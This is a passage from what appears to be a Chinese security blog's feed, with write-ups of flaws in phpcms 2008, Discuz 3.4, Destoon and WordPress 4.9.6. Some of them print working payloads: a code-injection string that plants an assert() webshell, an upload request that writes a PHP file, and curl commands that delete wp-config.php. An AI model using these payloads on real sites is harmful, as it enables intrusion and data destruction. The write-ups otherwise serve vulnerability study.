  @extract($_POST,EXTR_SKIP);</span><br><span class="line">        @extract($_GET,EXTR_SKIP);</span><br><span class="line">        @extract($_COOKIE,EXTR_SKIP);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</span><br><span class="line">    <span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面这段代码会通过<em>@extract()</em>将尚未注册的变量进行注册，如果有冲突，不覆盖已有的变量。因此通过这个伪全局可以绕过<em>if(empty($template)) $template = ‘type’;</em>这句话的指定，即<em>$template</em>变量可控。</p><p>跟入<em>template</em>函数，定义在 include/global.func.php:772<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</span><br><span class="line">        template_compile($module, $template, $istag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $compiledtplfile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里会进行一些判断，<em>TPL_REFRESH</em>表示是否开启模板缓存自动刷新，默认为1, 剩下的用于判断缓存超时。倘若需要更新缓存则进入了<em>template_compile()</em>函数，根据上一句的<em>require_once</em>可知定义在 include/template.func.php:2<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</span><br><span class="line">        $content = @file_get_contents($tplfile);</span><br><span class="line">        <span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span class="string">"$tplfile is not exists!"</span>);</span><br><span class="line">        $compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</span><br><span class="line">        $content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</span><br><span class="line">        $strlen = file_put_contents($compiledtplfile, $content);</span><br><span class="line">        @chmod($compiledtplfile, <span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> $strlen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>重点看<em>$content = ($istag || substr($template, 0, 4) == ‘tag_’)</em>这一句。由于<em>$template</em>可控，只要<em>$template</em>以<em>tag_</em>开头，就可以使得此处的三元表达式进入到第一个分支中，即相当于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></span><br></pre></td></tr></table></figure></p><p>由于$template未经过滤，被直接拼接到内容中，所以如果指定<em>tag_(){};@unlink(<em>FILE</em>);assert($_GET[1]);{//../rss</em> ，则拼接后的结果为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="string">'&lt;?php function _tag_phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></span><br></pre></td></tr></table></figure></p><p>可以看到一句话木马已经写入了<em>$content</em>，之后<em>file_put_contents($compiledtplfile, $content)</em>;将内容写入文件。</p><p>回到前面的template_compile函数中，<em>TPL_CACHEPATH</em>为常量<em>PHPCMS_ROOT.’data/cache_template/</em>; 可知 <em>$compiledtplfile</em> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</span><br><span class="line">```<span class="number">4</span></span><br><span class="line">即：</span><br><span class="line">```php</span><br><span class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</span><br></pre></td></tr></table></figure></p><p>所以payload末尾的../利用目录穿越使得最后的<em>$compiledtplfile</em>为<em>‘data/cache_template/rss.tpl.php</em><br><img src="/img/phpcms_2008_getshell/rss.tpl.php.png"><br>为了解析不出错，payload末尾处的//注释了拼接后的其余部分，如上图。</p><p>此后访问 <a href="http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo()</a><br><img src="/img/phpcms_2008_getshell/getshell.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpcms 2008 type.php 前台代码注入getshell漏洞分析&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/Exploit/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/tags/Exploit/"/>
    
      <category term="getshell" scheme="https://j2ekim.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>Discuz v3.4 排行页面存储型XSS漏洞分析</title>
    <link href="https://j2ekim.github.io/2018/10/15/Discuz_3_4-Xss/"/>
    <id>https://j2ekim.github.io/2018/10/15/Discuz_3_4-Xss/</id>
    <published>2018-10-15T05:43:19.000Z</published>
    <updated>2019-07-23T07:30:29.457Z</updated>
    
    <content type="html"><![CDATA[<p>2018年10月12日，Discuz官方修复了一处XSS漏洞：<br>    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181015113653-8ee3cbd6-d02b-1.jpeg"></p><h2 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h2><p>source/module/misc/misc_ranklist.php:166</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getranklist_members</span><span class="params">($offset = <span class="number">0</span>, $limit = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">require_once</span> libfile(<span class="string">'function/forum'</span>);</span><br><span class="line">$members = <span class="keyword">array</span>();</span><br><span class="line">$topusers = C::t(<span class="string">'home_show'</span>)-&gt;fetch_all_by_unitprice($offset, $limit, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">foreach</span>($topusers <span class="keyword">as</span> $member) &#123;</span><br><span class="line">$member[<span class="string">'avatar'</span>] = avatar($member[<span class="string">'uid'</span>], <span class="string">'small'</span>);</span><br><span class="line">$member[<span class="string">'note'</span>] = dhtmlspecialchars($member[<span class="string">'note'</span>]);</span><br><span class="line">$members[] = $member;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $members;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dz在此处获取到    $member[‘note’]     后调用了dhtmlspecialchars进行过滤，在source/function/function_core.php:203 会对’&amp;’, ‘“‘, ‘&lt;’, ‘&gt;’进行实体编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span><span class="params">($string, $flags = null)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">。。。</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>($flags === <span class="keyword">null</span>) &#123;</span><br><span class="line">$string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>), $string);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">。。。</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从getranklist_members返回后 source/include/misc/misc_ranklist_index.php:113</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">。。。</span><br><span class="line"><span class="keyword">if</span>($ranklist_setting[<span class="string">'member'</span>][<span class="string">'available'</span>]) &#123;</span><br><span class="line">$memberlist = getranklist_members(<span class="number">0</span>, <span class="number">27</span>);</span><br><span class="line">&#125;</span><br><span class="line">。。。</span><br><span class="line"><span class="keyword">include</span> template(<span class="string">'diy:ranklist/ranklist'</span>);</span><br></pre></td></tr></table></figure><p>进行模板的渲染在 data/template/1_diy_ranklist_ranklist.tpl.php:32<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>($memberlist) &#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;a href="home.php?mod=space&amp;amp;uid=&lt;?php echo $memberlist['0']['uid'];?&gt;&amp;amp;do=profile" target="_blank" id="bid_&lt;?php echo $memberlist['0']['uid'];?&gt;" class="hm" &lt;?php if($memberlist['0']['note']) &#123; ?&gt; onmouseover="showTip(trhis)" tip="&lt;?php echo $memberlist['0']['username'];?&gt;: &lt;?php echo $memberlist['0']['note'];?&gt;"&lt;?php &#125; ?&gt;&gt;&lt;?php echo avatar($memberlist[0][uid],middle);?&gt;&lt;/a&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以看到在tip属性中输出了$memberlist[‘0’][‘note’]。在之前有一个onmouseover事件，跟入showTip(trhis) 在 static/js/common.js:1062<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showTip</span><span class="params">(ctrlobj)</span> </span>&#123;</span><br><span class="line">$F(<span class="string">'_showTip'</span>, arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟入_showTip，在 static/js/common_extra.js:912<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_showTip</span><span class="params">(ctrlobj)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!ctrlobj.id) &#123;</span><br><span class="line">ctrlobj.id = <span class="string">'tip_'</span> + Math.random();</span><br><span class="line">&#125;</span><br><span class="line">menuid = ctrlobj.id + <span class="string">'_menu'</span>;</span><br><span class="line"><span class="keyword">if</span>(!$(menuid)) &#123;</span><br><span class="line"><span class="keyword">var</span> div = document.createElement(<span class="string">'div'</span>);</span><br><span class="line">div.id = ctrlobj.id + <span class="string">'_menu'</span>;</span><br><span class="line">div.className = <span class="string">'tip tip_4'</span>;</span><br><span class="line">div.style.display = <span class="string">'none'</span>;</span><br><span class="line">div.innerHTML = <span class="string">'&lt;div class="tip_horn"&gt;&lt;/div&gt;&lt;div class="tip_c"&gt;'</span> + ctrlobj.getAttribute(<span class="string">'tip'</span>) + <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">$(<span class="string">'append_parent'</span>).appendChild(div);</span><br><span class="line">&#125;</span><br><span class="line">$(ctrlobj.id).onmouseout = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; hideMenu(<span class="string">''</span>, <span class="string">'prompt'</span>); &#125;;</span><br><span class="line">showMenu(&#123;<span class="string">'mtype'</span>:<span class="string">'prompt'</span>,<span class="string">'ctrlid'</span>:ctrlobj.id,<span class="string">'pos'</span>:<span class="string">'12!'</span>,<span class="string">'duration'</span>:<span class="number">2</span>,<span class="string">'zindex'</span>:JSMENU[<span class="string">'zIndex'</span>][<span class="string">'prompt'</span>]&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过ctrlobj.getAttribute(‘tip’)获取tip属性的值，由于getAttribute获取的内容会自动反转义，即前面在dhtmlspecialchars编码过的内容又被解码了一次。此后拼接到div标签的innerHTML中，最后输出到页面上造成了xss</p><p>关于getAttribute，可以用下面代码测试：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">name</span>=<span class="string">"&amp;lt;a&amp;gt;"</span> <span class="attr">id</span>=<span class="string">"div"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">div1 = document.getElementById("div");</span></span><br><span class="line"><span class="undefined">align = div1.getAttribute("name");</span></span><br><span class="line"><span class="undefined">alert(align); </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该CMS中，排行榜功能是默认开启的。在地址 <a href="http://127.0.0.1/misc.php?mod=ranklist&amp;type=member" target="_blank" rel="noopener">http://127.0.0.1/misc.php?mod=ranklist&amp;type=member</a> 的上榜宣言中输入payload（拒绝伸手党）<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181015113702-949732ac-d02b-1.jpeg"></p><p>在 <a href="http://127.0.0.1/misc.php?mod=ranklist" target="_blank" rel="noopener">http://127.0.0.1/misc.php?mod=ranklist</a> 当鼠标移动到头像上触发onmouseover事件，执行xss<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181015142359-e6cc8c86-d042-1.gif"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181015113709-9884e8be-d02b-1.jpeg"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181015113709-9884e8be-d02b-1.jpeg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2018年10月12日，Discuz官方修复了一处XSS漏洞：&lt;br&gt;    &lt;img src=&quot;https://xzfile.aliyuncs.com/media/upload/picture/20181015113653-8ee3cbd6-d02b-1.jpeg&quot;&gt;&lt;/
      
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/Exploit/"/>
    
    
      <category term="Web Security" scheme="https://j2ekim.github.io/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>Destoon-20180827版本前台 Getshell漏洞复现</title>
    <link href="https://j2ekim.github.io/2018/09/24/Destoon-20180827_getshell/"/>
    <id>https://j2ekim.github.io/2018/09/24/Destoon-20180827_getshell/</id>
    <published>2018-09-24T01:24:48.000Z</published>
    <updated>2019-07-22T07:24:40.523Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>前段逛先知看到Destoon CMS出了个前台getshell<br><a href="https://xz.aliyun.com/t/2797" target="_blank" rel="noopener">某CMS 20180827版本 前台getshell</a><br>后来自己复现，死活没复现成功。 =- = ！<br>后来得到土司里的大牛给的启发，不然真是复现一辈子都失败</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="构造HTML表单"><a href="#构造HTML表单" class="headerlink" title="构造HTML表单"></a>构造HTML表单</h3><p>destoon 版本V7表单名称 name=”file”;V6 name=”upfile”<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:2019/cms/destoon4/member/avatar.php?"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        请选择我的上传文件</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"upload"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="使用Burp抓包，代码如下"><a href="#使用Burp抓包，代码如下" class="headerlink" title="使用Burp抓包，代码如下"></a>使用Burp抓包，代码如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/destoon4/member/avatar.php? HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:2019</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.2; zh-CN; rv:1.9.2) Gecko/20100115 Firefox/3.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: GB2312,utf-8;q=0.7,*;q=0.7</span><br><span class="line">Keep-Alive: 115</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Cookie: ECS[visit_times]=1; Hm_lvt_48bf675856393060353c4bc6a8e29735=1551440884; Hm_lvt_a63c644ec8aa82b8d1a60c277426e04f=1551440884; Hm_lvt_148424fa7770615e8f4f0901f3cfe5c4=1551440874; cmy_auth=0c639Z4eVUjR-P-kVmsNnQgO3QO1eQt5iqwLSNgVEG6gQc6F1TuzDq-S-Pj-S-lXsZ05fr2HUqxwZE-S-QYSTUSAMDtpmlQS; cmy_username=zzz; PHPSESSID=3droetn9h5lc848dn43b96hp05; cbx_auth=84f5Cb-S-pkgfGuyRPW7btm-P--S-R-P-th-S-sJxmJCRuKbtOjhUS-P-uzey7ORVS32w-S-Uca-P-zIzpTPyvFkATH0ZMlWIyzmZFoP; cbx_username=zzz</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------226482744623805</span><br><span class="line">Content-Length: 147439</span><br><span class="line"></span><br><span class="line">-----------------------------226482744623805</span><br><span class="line">Content-Disposition: form-data; name=&quot;action&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">-----------------------------226482744623805</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;2.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">-----------------------------226482744623805</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;2.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">PNG....</span><br><span class="line">&lt;?php file_put_content(&apos;./test.php&apos;,&apos;&lt;?php phpinfo();?&gt;&apos;)?&gt;</span><br><span class="line">-----------------------------226482744623805--</span><br></pre></td></tr></table></figure><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>最终得到webshell：/file/temp/test.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;前段逛先知看到Destoon CMS出了个前台getshell&lt;br&gt;&lt;a href=&quot;https://xz.aliyun.com/t/27
      
    
    </summary>
    
      <category term="Web安全" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/categories/Web%E5%AE%89%E5%85%A8/Exploit/"/>
    
    
      <category term="PHP" scheme="https://j2ekim.github.io/tags/PHP/"/>
    
      <category term="Exploit" scheme="https://j2ekim.github.io/tags/Exploit/"/>
    
      <category term="getshell" scheme="https://j2ekim.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>Wordpress &lt;= 4.9.6 任意文件删除漏洞</title>
    <link href="https://j2ekim.github.io/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/"/>
    <id>https://j2ekim.github.io/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility/</id>
    <published>2018-06-27T15:55:59.000Z</published>
    <updated>2018-07-10T19:52:57.051Z</updated>
    
    <content type="html"><![CDATA[<p>WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。<br><a id="more"></a></p><p>前段时间爆出来的洞，wp很久没看到洞了，听说这个洞已经报上去7个月了。</p><p><a href="https://wordpress.org/download/release-archive/" target="_blank" rel="noopener">Wordpress &lt;=4.9.6下载地址</a></p><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="1-使用PhpStudy安装Wordpress-4-9-6"><a href="#1-使用PhpStudy安装Wordpress-4-9-6" class="headerlink" title="1.使用PhpStudy安装Wordpress 4.9.6"></a>1.使用PhpStudy安装Wordpress 4.9.6</h4><p><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\install_wordpress.png"></p><h4 id="2-登录后台，添加媒体"><a href="#2-登录后台，添加媒体" class="headerlink" title="2.登录后台，添加媒体"></a>2.登录后台，添加媒体</h4><p>上传任意图片<br><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\upload_img.png"></p><h4 id="将-meta-‘thumb’-设置为我们要删除的文件"><a href="#将-meta-‘thumb’-设置为我们要删除的文件" class="headerlink" title="将 $meta[‘thumb’] 设置为我们要删除的文件"></a>将 $meta[‘thumb’] 设置为我们要删除的文件</h4><h5 id="点击第二步中我们上传的图片-并记住图片ID"><a href="#点击第二步中我们上传的图片-并记住图片ID" class="headerlink" title="点击第二步中我们上传的图片, 并记住图片ID."></a>点击第二步中我们上传的图片, 并记住图片ID.</h5><p><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\img_id.png"></p><p>#####在网页源代码中找到  <em> _wpnonce </em></p><p><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\find_wpnonce.png"></p><h5 id="记录下cookie"><a href="#记录下cookie" class="headerlink" title="记录下cookie"></a>记录下cookie</h5><p><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\cookie.png"></p><h5 id="发送PayLoad"><a href="#发送PayLoad" class="headerlink" title="发送PayLoad"></a>发送PayLoad</h5><p><pre><code>curl -v ‘<a href="http://localhost/wp-admin/post.php?post=4&#39;" target="_blank" rel="noopener">http://localhost/wp-admin/post.php?post=4&#39;</a> -H ‘Cookie: <strong><em>‘ -d ‘action=editattachment&amp;_wpnonce=</em></strong>&amp;thumb=../../../../wp-config.php’<br></code></pre><br><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\curl_payload_1.png"></p><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><h5 id="在网页源码中找到另外一个-wpnonce"><a href="#在网页源码中找到另外一个-wpnonce" class="headerlink" title="在网页源码中找到另外一个 _wpnonce."></a>在网页源码中找到另外一个 _wpnonce.</h5><p><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\find_wpnonce_2.png"></p><h5 id="发送Payload"><a href="#发送Payload" class="headerlink" title="发送Payload:"></a>发送Payload:</h5><p><pre><code>curl -v ‘http:/localhost/wp-admin/post.php?post=4’ -H ‘Cookie: <strong><em>‘ -d ‘action=delete&amp;_wpnonce=</em></strong>‘</code></pre><br><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\curl_payload_2.png"></p><h4 id="刷新网页"><a href="#刷新网页" class="headerlink" title="刷新网页"></a>刷新网页</h4><p>配置文件被删，导致重装。<br><img src="\img\Wordpress_4.9.6 Arbitrary-File-Delection-Vulnerbility\fission.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WordPress是如今使用最为广泛的一套内容管理系统。根据 w3tech 统计，全世界大概有30%的网站运行着WordPress程序。&lt;br&gt;
    
    </summary>
    
